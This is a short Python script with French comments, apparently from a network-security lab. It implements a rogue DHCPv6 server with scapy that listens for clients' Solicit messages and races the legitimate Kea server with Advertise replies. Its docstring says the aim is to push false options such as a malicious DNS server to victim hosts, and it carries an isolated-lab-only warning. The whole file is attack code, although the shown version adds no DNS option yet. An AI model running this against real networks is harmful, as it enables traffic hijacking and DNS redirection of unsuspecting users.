#!/usr/bin/env python3
"""
rogue_dhcpv6.py — Serveur DHCPv6 pirate minimal : répond aux Solicit des
hôtes victimes avant (ou à la place de) Kea, pour leur distribuer de
fausses options (DNS malveillant, etc).

⚠️ Labo isolé uniquement (namespace "attaquant").

Usage :
    python3 rogue_dhcpv6.py --iface eth1
"""
import argparse
from scapy.all import sniff, send, IPv6, UDP
from scapy.layers.dhcp6 import DHCP6_Solicit, DHCP6_Advertise


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--iface", required=True)
    p.add_argument("--attacker-ip", default="fe80::66")
    args = p.parse_args()

    def handle(pkt):
        if DHCP6_Solicit in pkt and IPv6 in pkt:
            reply = (
                IPv6(src=args.attacker_ip, dst=pkt[IPv6].src) /
                UDP(sport=547, dport=546) /
                DHCP6_Advertise(trid=pkt[DHCP6_Solicit].trid)
            )
            send(reply, iface=args.iface, verbose=False)
            print(f"[rogue-dhcpv6] Advertise envoyé à {pkt[IPv6].src}")

    print(f"Serveur DHCPv6 pirate à l'écoute sur {args.iface} (udp/547)...")
    sniff(iface=args.iface, prn=handle, filter="udp port 547", store=False)


if __name__ == "__main__":
    main()
